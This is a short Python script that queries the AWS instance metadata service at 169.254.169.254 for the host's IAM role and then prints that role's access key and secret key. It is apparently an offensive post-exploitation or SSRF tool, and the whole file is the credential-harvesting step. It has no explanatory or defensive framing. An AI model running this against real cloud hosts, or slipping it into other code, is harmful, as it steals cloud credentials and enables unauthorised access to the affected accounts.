import requests

url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
try:
    r = requests.get(url, timeout=2)
    print(f"[+] IAM Role: {r.text}")
    creds = requests.get(url + r.text.strip(), timeout=2).json()
    print(f"[+] Access Key: {creds['AccessKeyId']}")
    print(f"[+] Secret Key: {creds['SecretAccessKey']}")
except Exception as e:
    print(f"[-] Failed to fetch metadata: {e}")
